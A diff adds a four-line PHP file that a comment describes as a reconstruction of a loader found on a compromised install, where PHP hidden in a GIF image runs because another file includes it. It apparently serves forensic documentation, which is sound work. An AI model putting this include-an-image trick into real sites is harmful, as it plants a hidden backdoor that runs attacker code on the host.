@@ -1,0 +1,4 @@
+<?php
+/* Reconstruction of a logo.php found on a compromised install:
+   PHP hidden in a picture, run by including it. Stored as .txt. */
+include('/home/example/bin/start.gif');
